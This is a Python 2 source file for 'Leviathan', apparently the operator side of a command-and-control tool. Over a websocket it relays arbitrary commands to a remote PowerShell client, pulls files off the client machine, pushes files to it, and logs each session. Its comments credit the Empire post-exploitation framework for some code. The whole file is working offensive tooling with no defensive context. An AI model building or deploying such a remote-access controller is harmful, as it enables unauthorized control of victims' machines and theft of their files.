import base64
import os, time, sys, datetime, time, zlib
import glob
from pydispatch import dispatcher
import cmd


levianthanIntro = '''
______ _____________    _________________ ______________  _________ _____   __
___  / ___  ____/__ |  / /____  _/___    |___  __/___  / / /___    |___  | / /
__  /  __  __/   __ | / /  __  /  __  /| |__  /   __  /_/ / __  /| |__   |/ / 
_  /____  /___   __ |/ /  __/ /   _  ___ |_  /    _  __  /  _  ___ |_  /|  /  
/_____//_____/   _____/   /___/   /_/  |_|/_/     /_/ /_/   /_/  |_|/_/ |_/   
                                                                             
'''

class Leviathan(cmd.Cmd):
	"""Class that will serve as the menu for client interaction and handle client data"""
	def __init__(self, websocket, clientName, clientUser):
		cmd.Cmd.__init__(self)
		self.intro = levianthanIntro
		self.prompt = "PS %s@%s > " % (clientUser, clientName)
		self.do_help.__func__.__doc__ = '''Displays the help menu.'''
		self.ws = websocket
		self.clientName = clientName
		self.clientUser = clientUser
		self.sessionLogFile = "sessionLog-%s-%s-%s.txt" % (self.clientName,self.clientUser,time.strftime("%d%m%Y"))

	def preloop(self):
		"""Initialize the history var"""
		cmd.Cmd.preloop(self)
		self._hist = {}

	def cmdloop(self):
		try:
			return cmd.Cmd.cmdloop(self)

		except KeyboardInterrupt:
			try:
				background = raw_input("Exit Session (Y/N)?")
				if background.lower() == 'y':
					self.ws.close()
					return True
				elif background.lower() == 'n':
					return cmd.Cmd.cmdloop(self)
			except KeyboardInterrupt as e:
				raise e

	def postloop(self):
		"""Print exiting message"""
		cmd.Cmd.postloop(self)
		print "Exiting websocket session....\n"

	def default(self, line):
		"Default Handler"
		#YOLO send the command to the powershell client
		task = "\x00|"+line
		self.sendNewTask(data=task)

	def do_download(self, line):
		"""Download a file from the client"""
		line = line.strip()
		task = "\x01|"+line
		self.sendNewTask(data=task)

	def do_upload(self, line):
		"""Upload a file"""
		line = line.strip()
		if os.path.exists(line):
			task = "\x02|"
			f = open(line, 'r')
			filename = os.path.basename(line)
			data = base64.b64encode(f.read())
			data += "|"+filename
			task += data
			self.sendNewTask(data=task)
		else:
			print "local file does not exist\n"
			pass

	def do_dumphistory(self, line):
		"""Print all available history"""
		history = ""
		for time, command in self._hist.iteritems():
			history += "%s %s\n" % (time, command)

		print history



	def do_exit(self, line):
		"""Exit the current WebSocketSession"""
		task = "\x03"
		encData = base64.b64encode(task)
		self.ws.send(encData)
		raise KeyboardInterrupt

	def emptyline(self):
		pass

	def sendNewTask(self, data):
		"""Send a new task to the client"""
		encData = base64.b64encode(data)
		self.ws.send(encData)

		encodedData = self.ws.receive()
		clientData = base64.b64decode(encodedData)
		self.handleData(clientData)

	def handleData(self, data):
		"""Parse tasking results"""
		taskID = data[0:4]
		taskData = data[5:]

		if taskID == "\x00\x00\x00\x00":
			'''Command shell'''
			try:
				print str(taskData.decode('ascii')) + '\n'
			except Exception:
				pass

		elif taskID == "\x01\x00\x00\x00":
			'''File Download'''
			fileData, fileName = taskData.split('|')
			fileName = fileName.decode('ascii')
			f = open(fileName, 'wb')
			rawEncData = base64.b64decode(fileData)
			rawData = zlib.decompress(rawEncData, -15)
			f.write(rawData)
			f.close()
			print "File saved to %s" % (os.path.abspath(fileName))
		elif taskID == "\x02\x00\x00\x00":
			'''File upload'''
			print str(taskData.decode('ascii'))
		elif taskID == "\x04\x00\x00\x00":
			'''Errors executing task'''
			print str(taskData.decode('ascii'))
		else:
			print "task failed"


	def precmd(self, line):
		"""Add the command to history"""
		if not os.path.exists(self.sessionLogFile):
			f = open(self.sessionLogFile, 'w+')
			f.write('\n')
			f.close()

		f = open(self.sessionLogFile, 'a+')
		ts = time.time()
		st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d_%H:%M:%S')
		f.write("%s:%s\r\n" % (st, line))
		f.close()
		self._hist[st] = line
		return line

	def complete_upload(self, text, line, begidx, endidx):
		"Tab-complete an upload file path"
		"""
		Helper for tab-completion of file paths. Taken directly from Empire
		"""

		# stolen from dataq at
		#   http://stackoverflow.com/questions/16826172/filename-tab-completion-in-cmd-cmd-of-python

		return self.complete_path(text, line)

	def complete_path(self, text, line, arg=False):
		'''Tab completion for local file paths'''
		# stolen from empire
		# stolen from dataq at
    	#http://stackoverflow.com/questions/16826172/filename-tab-completion-in-cmd-cmd-of-python

		if arg:
			# if we have "command something path"
			argData = line.split()[1:]
		else:
			# if we have "command path"
			argData = line.split()[0:]

		if not argData or len(argData) == 1:
			completions = os.listdir('./')
		else:
			dir, part, base = argData[-1].rpartition('/')
			if part == '':
				dir = './'
			elif dir == '':
				dir = '/'            

			completions = []
			for f in os.listdir(dir):
				if f.startswith(base):
					if os.path.isfile(os.path.join(dir,f)):
						completions.append(f)
					else:
						completions.append(f+'/')

		return completions


